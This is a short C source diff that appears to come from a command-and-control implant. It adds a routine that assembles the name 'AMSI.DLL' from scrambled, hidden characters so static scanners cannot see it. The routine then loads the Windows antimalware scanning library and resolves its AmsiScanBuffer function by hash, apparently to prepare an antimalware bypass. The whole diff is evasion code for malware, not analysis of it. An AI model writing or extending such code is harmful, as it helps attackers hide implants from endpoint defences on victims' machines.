@@ -400,6 +400,33 @@ BOOL RtSspicli(
     return TRUE;
 }
 
+BOOL RtAmsi(
+    VOID
+) {
+    CHAR ModuleName[ 9 ] = { 0 };
+
+    ModuleName[ 3 ] = HideChar('I');
+    ModuleName[ 5 ] = HideChar('D');
+    ModuleName[ 7 ] = HideChar('L');
+    ModuleName[ 8 ] = HideChar(0);
+    ModuleName[ 6 ] = HideChar('L');
+    ModuleName[ 4 ] = HideChar('.');
+    ModuleName[ 0 ] = HideChar('A');
+    ModuleName[ 1 ] = HideChar('M');
+    ModuleName[ 2 ] = HideChar('S');
+
+    if ( ( Instance.Modules.Amsi = LdrModuleLoad( ModuleName ) ) ) {
+        Instance.Win32.AmsiScanBuffer = LdrFunctionAddr( Instance.Modules.Amsi, H_FUNC_AMSISCANBUFFER );
+
+        PUTS( "Loaded Amsi functions" )
+    } else {
+        PUTS( "Failed to load Amsi" )
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
 #ifdef TRANSPORT_HTTP
 BOOL RtWinHttp(
     VOID
